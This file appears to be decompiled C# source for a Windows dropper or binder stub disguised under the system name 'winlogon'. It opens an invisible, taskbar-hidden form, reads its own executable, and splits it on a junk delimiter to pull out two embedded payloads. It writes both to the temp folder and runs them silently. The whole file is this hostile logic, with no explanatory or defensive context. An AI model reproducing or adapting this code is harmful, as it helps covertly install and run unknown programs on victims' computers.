using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace winlogon;

[DesignerGenerated]
public class Blank : Form
{
	private IContainer icontainer_0;

	[DebuggerNonUserCode]
	public Blank()
	{
		((Form)this).add_Load((EventHandler)delegate
		{
			loads();
		});
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Blank");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	public void loads()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string[] array = default(string[]);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 404:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_0029;
						case 5:
							goto IL_003d;
						case 6:
							goto IL_0050;
						case 7:
							goto IL_0061;
						case 8:
							goto IL_0081;
						case 9:
							goto IL_0097;
						case 10:
							goto IL_00ab;
						case 11:
							goto IL_00cc;
						case 12:
							goto IL_00e3;
						case 13:
							goto IL_00f7;
						case 14:
							goto IL_0113;
						case 15:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0113:
					num = 14;
					Process.Start(Interaction.Environ("tmp") + array[4]);
					break;
					IL_00f7:
					num = 13;
					Process.Start(Interaction.Environ("tmp") + array[3]);
					goto IL_0113;
					IL_0008:
					num = 2;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_001a;
					IL_001a:
					num = 3;
					text = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_0029;
					IL_0029:
					num = 4;
					FileSystem.FileGet(1, ref text, -1L, false);
					goto IL_003d;
					IL_003d:
					num = 5;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_0050;
					IL_0050:
					num = 6;
					array = Strings.Split(text, "wdadaclawclawdlawdawdladaowoatmaomfafnafoawdaocajcawcawpmapwdmpadmwapdmapdaXXX3", -1, (CompareMethod)0);
					goto IL_0061;
					IL_0061:
					num = 7;
					FileSystem.FileOpen(3, Interaction.Environ("tmp") + array[3], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_0081;
					IL_0081:
					num = 8;
					FileSystem.FilePut(3, array[1], -1L, false);
					goto IL_0097;
					IL_0097:
					num = 9;
					FileSystem.FileClose(new int[1] { 3 });
					goto IL_00ab;
					IL_00ab:
					num = 10;
					FileSystem.FileOpen(5, Interaction.Environ("tmp") + array[4], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_00cc;
					IL_00cc:
					num = 11;
					FileSystem.FilePut(5, array[2], -1L, false);
					goto IL_00e3;
					IL_00e3:
					num = 12;
					FileSystem.FileClose(new int[1] { 5 });
					goto IL_00f7;
					end_IL_0000_2:
					break;
				}
				num = 15;
				((Form)this).Close();
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 404;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
